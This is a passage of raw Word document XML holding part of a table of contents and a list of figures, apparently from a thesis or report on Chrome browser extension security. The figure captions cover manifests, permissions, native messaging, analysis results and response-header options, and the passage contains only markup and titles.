            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>32</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3765458E" w14:textId="7947D693" w:rsidR="00642218" w:rsidRPr="00642218" w:rsidRDefault="00683412">
      <w:pPr>
        <w:pStyle w:val="TOC1"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="480"/>
          <w:tab w:val="right" w:leader="dot" w:pos="9345"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc523071528" w:history="1">
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:lang w:bidi="he-IL"/>
          </w:rPr>
          <w:t>6.</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:b w:val="0"/>
            <w:bCs w:val="0"/>
            <w:caps w:val="0"/>
            <w:noProof/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:lang w:bidi="he-IL"/>
          </w:rPr>
          <w:t>CONCLUSION</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc523071528 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>33</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="432A2AA2" w14:textId="39526F5B" w:rsidR="00642218" w:rsidRPr="00642218" w:rsidRDefault="00683412">
      <w:pPr>
        <w:pStyle w:val="TOC1"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9345"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc523071529" w:history="1">
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:lang w:val="en" w:bidi="he-IL"/>
          </w:rPr>
          <w:t>REFERENCES</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc523071529 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>34</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="39439526" w14:textId="2E40922C" w:rsidR="00194DEF" w:rsidRDefault="00194DEF" w:rsidP="00194DEF">
      <w:pPr>
        <w:spacing w:before="0" w:after="240" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00642218">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="70BDAD17" w14:textId="77777777" w:rsidR="00194DEF" w:rsidRDefault="00194DEF" w:rsidP="00194DEF">
      <w:pPr>
        <w:spacing w:before="0" w:after="240" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="37A646D7" w14:textId="77777777" w:rsidR="00194DEF" w:rsidRDefault="00194DEF" w:rsidP="00194DEF">
      <w:pPr>
        <w:spacing w:before="0" w:after="240" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="00F866C6" w14:textId="4E2E4489" w:rsidR="00194DEF" w:rsidRDefault="00194DEF" w:rsidP="00194DEF">
      <w:pPr>
        <w:spacing w:before="0" w:after="240" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="60080DE4" w14:textId="531742C3" w:rsidR="00642218" w:rsidRDefault="00642218" w:rsidP="00194DEF">
      <w:pPr>
        <w:spacing w:before="0" w:after="240" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0289B0A0" w14:textId="77777777" w:rsidR="00CA5C06" w:rsidRDefault="00CA5C06" w:rsidP="003A7B5E">
      <w:pPr>
        <w:spacing w:before="0" w:after="240" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="774992A8" w14:textId="77777777" w:rsidR="00E63785" w:rsidRPr="00194DEF" w:rsidRDefault="00724A19" w:rsidP="00194DEF">
      <w:pPr>
        <w:spacing w:before="0" w:after="240" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r w:rsidRPr="00194DEF">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>LIST OF FIGURES</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32C26DA6" w14:textId="7B8DD6AB" w:rsidR="00642218" w:rsidRDefault="00FF5D68">
      <w:pPr>
        <w:pStyle w:val="TableofFigures"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9345"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:u w:val="dotted"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:u w:val="dotted"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> TOC \h \z \c "Figure" </w:instrText>
      </w:r>
      <w:r>
        <w:rPr>
          <w:u w:val="dotted"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:hyperlink r:id="rId10" w:anchor="_Toc523071573" w:history="1">
        <w:r w:rsidR="00642218" w:rsidRPr="004A5D47">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Figure 1: manifest.json file.</w:t>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc523071573 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>14</w:t>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="67F53D6A" w14:textId="313E983B" w:rsidR="00642218" w:rsidRDefault="00683412">
      <w:pPr>
        <w:pStyle w:val="TableofFigures"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9345"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId11" w:anchor="_Toc523071574" w:history="1">
        <w:r w:rsidR="00642218" w:rsidRPr="004A5D47">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Figure 2: Example of manifest containing API permissions, content scripts, background script and CSP.</w:t>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc523071574 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>15</w:t>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4641E99E" w14:textId="097CF31B" w:rsidR="00642218" w:rsidRDefault="00683412">
      <w:pPr>
        <w:pStyle w:val="TableofFigures"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9345"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc523071575" w:history="1">
        <w:r w:rsidR="00642218" w:rsidRPr="004A5D47">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Figure 3: Connecting to native messaging host.</w:t>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc523071575 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>22</w:t>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="69AC31A1" w14:textId="52924D74" w:rsidR="00642218" w:rsidRDefault="00683412">
      <w:pPr>
        <w:pStyle w:val="TableofFigures"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9345"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc523071576" w:history="1">
        <w:r w:rsidR="00642218" w:rsidRPr="004A5D47">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Figure 4: Running the analysis.</w:t>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc523071576 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>22</w:t>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0DF8E886" w14:textId="45A9DF1D" w:rsidR="00642218" w:rsidRDefault="00683412">
      <w:pPr>
        <w:pStyle w:val="TableofFigures"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9345"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc523071577" w:history="1">
        <w:r w:rsidR="00642218" w:rsidRPr="004A5D47">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Figure 5: Running the analysis (after clicking).</w:t>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc523071577 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>23</w:t>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="20FD19E6" w14:textId="1F601BEA" w:rsidR="00642218" w:rsidRDefault="00683412">
      <w:pPr>
        <w:pStyle w:val="TableofFigures"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9345"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc523071578" w:history="1">
        <w:r w:rsidR="00642218" w:rsidRPr="004A5D47">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Figure 6: Window with results.</w:t>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc523071578 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>23</w:t>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="28D74F64" w14:textId="675E86FC" w:rsidR="00642218" w:rsidRDefault="00683412">
      <w:pPr>
        <w:pStyle w:val="TableofFigures"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9345"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc523071579" w:history="1">
        <w:r w:rsidR="00642218" w:rsidRPr="004A5D47">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Figure 7: Access to Chrome’s extensions configuration page.</w:t>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc523071579 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>24</w:t>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="670D8A10" w14:textId="2A0EB955" w:rsidR="00642218" w:rsidRDefault="00683412">
      <w:pPr>
        <w:pStyle w:val="TableofFigures"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9345"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc523071580" w:history="1">
        <w:r w:rsidR="00642218" w:rsidRPr="004A5D47">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Figure 8: DoS.</w:t>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc523071580 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>24</w:t>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0D7686BF" w14:textId="507493B9" w:rsidR="00642218" w:rsidRDefault="00683412">
      <w:pPr>
        <w:pStyle w:val="TableofFigures"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9345"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc523071581" w:history="1">
        <w:r w:rsidR="00642218" w:rsidRPr="004A5D47">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Figure 9: Extension installation/uninstallation.</w:t>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc523071581 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>25</w:t>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="171BF554" w14:textId="1CBC8BC2" w:rsidR="00642218" w:rsidRDefault="00683412">
      <w:pPr>
        <w:pStyle w:val="TableofFigures"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9345"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc523071582" w:history="1">
        <w:r w:rsidR="00642218" w:rsidRPr="004A5D47">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Figure 10: HTTP response header security options.</w:t>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc523071582 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>25</w:t>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="269F43E0" w14:textId="28F5656D" w:rsidR="00642218" w:rsidRDefault="00683412">
      <w:pPr>
        <w:pStyle w:val="TableofFigures"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9345"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc523071583" w:history="1">
        <w:r w:rsidR="00642218" w:rsidRPr="004A5D47">
